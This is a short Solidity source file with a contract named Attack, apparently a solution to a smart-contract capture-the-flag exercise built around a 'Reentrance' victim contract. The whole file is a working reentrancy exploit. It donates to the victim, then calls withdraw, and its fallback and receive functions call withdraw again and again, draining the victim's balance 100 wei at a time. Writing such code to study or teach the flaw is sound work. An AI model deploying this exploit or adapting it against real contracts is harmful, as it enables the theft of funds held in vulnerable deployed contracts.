// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 

import "./Reentrance.sol";

contract Attack {
    Reentrance public attacker;

    constructor(address _victimAddress) {
        attacker = Reentrance(_victimAddress);
    }

    fallback() external payable {
        if (address(attacker).balance >= 100 wei) {
            attacker.withdraw(100);
        }
    }

    receive() external payable {
        if (address(attacker).balance >= 100 wei) {
            attacker.withdraw(100);
        }
    }

    function attack() external payable {
        require(msg.value >= 100 wei);
        attacker.donate{value: 100 wei}(address(this));
        attacker.withdraw(100);
    }


}
